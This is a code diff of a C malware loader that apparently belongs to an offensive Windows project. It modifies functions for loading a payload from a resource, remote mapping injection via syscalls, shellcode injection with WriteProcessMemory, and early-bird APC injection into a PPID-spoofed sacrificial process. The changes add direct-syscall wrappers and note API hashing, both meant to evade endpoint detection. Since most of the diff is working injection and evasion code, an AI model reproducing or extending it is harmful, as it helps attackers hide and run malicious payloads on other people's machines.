@@ -43,20 +43,23 @@ BOOL LoadPayloadFromResource(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSi
 	return TRUE;
 }
 
-// TODO: understand the code
-// TODO: use syscalls and API hashing
+// TODO: use syscalls
 BOOL IsProcessElevated(HANDLE hProcess) {
 	HANDLE			hToken = NULL;
 	TOKEN_ELEVATION elevation = { 0 };
 	DWORD			dwSize = 0;
 
+	// TODO: use syscall NtOpenProcessToken
 	if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
 		return FALSE;  // Assume not elevated if we can't open the token
 	}
 
-	// TODO: use syscall
+	// TODO: use syscall NtQueryInformationToken
 	if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
-		CloseHandle(hToken);
+		WhisperHell(g_SyscallsTable.NtClose.wSystemCall);
+		if (NtClose(hToken) != 0x0) {
+			PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", GetLastError());
+		}
 		return FALSE;
 	}
 
@@ -279,13 +282,12 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 }
 
 // Function used for APC Injection with PPID Spoofing
-// TODO: use API hashings
 BOOL CreatePpidSpoofedProcessWithAlertableThread(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread)
 {
 	CHAR                               lpPath[MAX_PATH * 2];
 	CHAR                               WnDr[MAX_PATH];
 
-	SIZE_T                             sThreadAttList = NULL;
+	SIZE_T                             sThreadAttList = 0;
 	PPROC_THREAD_ATTRIBUTE_LIST        pThreadAttList = NULL;
 
 	STARTUPINFOEXA                     SiEx = { 0 };
@@ -390,7 +392,7 @@ BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sS
 	PRINTA("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);
 
 
-	PRINTA("[#] Press <Enter> To Write Payload ... ");
+	PRINTA("[#] Press <Enter> To Write Payload ... \n");
 	GETCHAR();
 	// Write the shellcode in the allocated memory
 	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
@@ -427,7 +429,7 @@ BOOL RemoteEarlyBirdApcInjectionViaSyscalls(HANDLE hParentProcess, LPCSTR pstrSa
 	}
 	PRINTA("[+] Created Sacrificial Process: %s with PID: %d And Handle: %p!\n", pstrSacrificalProcessName, dwProcessId, hProcess);
 
-	PRINTA("Press <Enter> To Inject Shellcode ... ");
+	PRINTA("Press <Enter> To Inject Shellcode ... \n");
 	GETCHAR();
 
 	// Inject the shellcode to the sacrificial process
@@ -436,7 +438,7 @@ BOOL RemoteEarlyBirdApcInjectionViaSyscalls(HANDLE hParentProcess, LPCSTR pstrSa
 		return -1;
 	}
 	PRINTA("[+] Shellcode Injected At : 0x%p \n", pInjectedAddress);
-	PRINTA("[i] Press <Enter> To Queue The APC ... ");
+	PRINTA("[i] Press <Enter> To Queue The APC ... \n");
 	GETCHAR();
 
 	if (!QueueUserAPC((PAPCFUNC)pInjectedAddress, hThread, NULL)) {
